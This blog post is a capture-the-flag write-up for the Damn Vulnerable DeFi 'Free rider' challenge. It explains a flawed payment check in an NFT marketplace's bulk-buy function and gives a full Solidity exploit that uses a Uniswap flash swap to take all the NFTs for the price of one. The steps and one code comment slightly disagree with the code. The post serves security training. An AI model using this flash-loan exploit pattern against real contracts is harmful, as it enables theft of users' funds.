---
title: 'Damn Vulnerable DeFi Challenge #10 Solution — Free rider'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>We start with 25 ETH and 1000 DVTs in balance and we need to drain all the Pool 100000 DVTs.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2022-06-05T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

This is Part 10 of the ["Let’s play Damn Vulnerable DeFi CTF"](https://stermi.xyz/blog/lets-play-damn-vulnerable-defi) series, where I will explain how to solve each challenge.

> [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.
> Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #10  —  Free rider

> A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.
>
> A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.
>
> You want to build some rep with this buyer, so you’ve agreed with the plan.
>
> Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/free-rider)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/free-rider/free-rider.challenge.js)

## The attacker end goal

We start with 0,5 ETH. Our whistleblower (Buyer) told us that the NFT Marketplace is exploitable, and we need to find and use that exploit to buy all the NFT and send them to the buyer to get our part of the deal.

If the Marketplace has not an exploit that allows us to get those NFTs for free, we need to find a way to get more ETH because I don’t think we can do much with 0,5 ETH when each of those NFT costs as much as 15 ETH!

Anyway, at the end of the day, our goal is to get those 45 ETH from the Buyer after sending all the 6 NFT. Let’s see what we can do.

PS: the challenge description does not mention it, but if you look at the test file, you see that a UniswapV2 exchange is deployed with liquidity for the pair DVT-WETH.

## Study the contracts

### `FreeRiderBuyer.sol`

This is the Buyer contract, nothing fancy to see. It’s a smart contract configured to send to the `partner` address 45 ETH after receiving (it’s listening through the `onERC721Received` callback) 6 NFTs from a specific `nft` contract.

The only thing to be aware (but this is out of context here) is that the onERC721Received callback, the contract will send the `JOB_PAYOUT` only if `received == 6`. So remember to just send them at max 6 NFTs, after that, you are not going to get anything back ;)

### `FreeRiderNFTMarketplace.sol`

Let’s take a look at the Marketplace contract, the one that should be exploitable.

The contract is compiled with `pragma solidity ^0.8.0;`so there should be no problem with under/overflow.

It inherits and uses OpenZeppelin `ReentrancyGuard` so also reentrancy should be covered.

Let’s look at each function to better understand where we can attack it

- `constructor(uint8 amountToMint) payable`

In the `constructor` the contract create and deploy a new `DamnValuableNFT` contract and mint `amountToMint` (6 in our case) NFTs, transferring them to the contract deployer.

- `function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant`

This function is used by NFTs owners that want to put up for sale an NFT. The function has the `noonReentrant` modifier but to be honest, I don't see any reason to have it, at least here. Both the `offerMany` and `_offerOne` don’t make any external calls that could create a problem. Anyway, **better safe (and pay extra gas) than sorry, right**?

Anyway, the function do some base checks on the user input and call, for each token and price, the private function`_offerOne(uint256 tokenId, uint256 price)`.

This function check that the price is greater than zero (preventing someone to list a token for free), check that the `msg.sender` is indeed the token owner and that the Marketplace contract is approved to handle the token (needed at sell time).

At the end of the function, it stores the offer’s price inside `offers[tokenId]`, increase the `amountOfOffers` (only used probably by other contracts/external service) and `emit NFTOffered` event.

The result of `offerMany` is that the seller will create, for each `token[i]` an `offer[tokenId]` with price `price[i]` only if he/she’s the owner of the token and if he/she has approved the marketplace to handle the token.

- `function buyMany(uint256[] calldata tokenIds) external payable nonReentrant`

This is the function called by the buyer that allows us to buy in bulk tokens listed in the marketplace. For each token in `tokenIds` array, the function will call the private function `_buyOne`. The contract uses the `nonReentrant` modifier, so it’s not affected by reentrancy attacks that could be caused by the external callback `onERC721Received` called on the receiving contract `token.safeTransferFrom`.

Do you spot any problem in this function? **There’s a huge red flag**!

The function allows you to buy NFTs in bulk, checking only if `msg.value` is equal or greater of each item’s price, but not the total price that the buyer needs to pay to buy all the NFTs.

Let’s make an example: you want to buy `tokenID1`, `tokenID2` and `tokenID3`. `tokenID1` costs `1 ETH`, tokenID2 costs `5 ETH` and `tokenID3` costs `10 ETH`. Normally, the user should call `buyMany{value: 16 ether}([tokenID1, tokenID2 and tokenID3])` but without that check we just have to call the function just paying the cost of the most expensive item → `buyMany{value: 10 ether}([tokenID1, tokenID2 and tokenID3])`

## Prepare the attack

Ok, we have spotted the exploit. Each NFT in the Marketplace costs 15 ETH, so we will “just” pay 15 ETH to get all 6 NFT instead of paying 90. What a steal!

But wait, we only have 0.5 ETH in our wallet, and we need to pay for the gas. How can we get at least 15 ETH just to make the buy, transfer them to the Buyer and get our bounty back?

In the description of the challenge it’s not explicitly said, but if you look at the tests there is an Uniswap V2 exchange for WETH/DVT.

UniswapV2 exchanges offer a mechanism called `Flash Swaps`. You can read more about them on the Flash Swaps [Uniswap official documentation](https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps). Basically, it allows us to take a flashloan that must be repaid with a 0.3% fee on the amount we got loaned for the transaction.

What do we need to do to pass the challenge? Let’s see the code and each step:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// ... imports

contract FlashSwapV2 is IUniswapV2Callee, ERC721Holder {

    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    address owner;
    uint8 numberOfNFT;
    uint256 nftPrice;

    constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, uint8 _numberOfNFT, uint256 _nftPrice) {
        owner = msg.sender;
        pair = _pair;
        marketplace = _marketplace;
        numberOfNFT = _numberOfNFT;
        nftPrice = _nftPrice;
    }

    function exploit() external {
        // need to pass some data to trigger uniswapV2Call
        // borrow 15 ether of WETH
        bytes memory data = abi.encode(pair.token0(), nftPrice);

        pair.swap(nftPrice, 0, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint256,
        uint256,
        bytes calldata _data
    ) external override {
        require(msg.sender == address(pair), "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // unwrap WETH
        IWETH weth = IWETH(tokenBorrow);
        weth.withdraw(amount);

        // buy tokens from the marketplace
        uint256[] memory tokenIds = new uint256[](numberOfNFT);
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        // send all of them to the buyer
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), owner, tokenId);
        }

        // wrap enough WETH9 to repay our debt
        weth.deposit{value: amountToRepay}();

        // repay the debt
        IERC20(tokenBorrow).transfer(address(pair), amountToRepay);

        // selfdestruct to the owner
        selfdestruct(payable(owner));
    }

    receive() external payable {}

}

contract FreeRiderTest is BaseTest, ERC721Holder {
    // ... setup code

    constructor() {
        // ... setup code
    }

    function setUp() public override {
        // ... setup code
    }


    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // Deploy the exploit contract that will make a flash swap (flash loan)
        // will buy all the NFT from the marketplace exloiting the bug (transfer before ownership sendValue)
        // repay debt -> transfer nft to attacker, selfdestruct sending all money back to attacker
        vm.startPrank(attacker);
        FlashSwapV2 flashSwapper = new FlashSwapV2(uniswapPair, marketplace, AMOUNT_OF_NFTS, NFT_PRICE);
        vm.label(address(flashSwapper), "FlashSwapV2");
        flashSwapper.exploit();
        vm.stopPrank();


        vm.startPrank(attacker, attacker);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            // transfer all the NFT we purchased from the marketplace to the buyerContrac to get the prize!
            nft.safeTransferFrom(attacker, address(buyerContract), tokenId);
        }
        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
    }
}
```

1.  Create a smart contract that will ask a flashloan to Uniswap for 15 WETH
2.  Implement the `uniswapV2Call` callback called by Uniswap where we will receive the loan
3.  Uniswap the WETH to ETH
4.  Call `marketplace.buyMany{value: nftPrice}(tokenIds);` to buy all the NFTs
5.  Send them to the `FreeRiderBuyer`’s contract. After we have sent the 6th token, the contract will transfer back to our exploit contract 45 ETH
6.  Repay the loan to Uniswap
7.  Selfdestruct the contract, sending all the ~30 ETH back to the attacker. To be precise we will gain less than 30 ETH because we need to pay for the gas and for the loan’s fee that is 0.3% but still, it’s a good profit!

You can find the full solution on GitHub, looking at [FreeRiderTest.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/free-rider/FreeRiderTest.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract FreeRiderTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
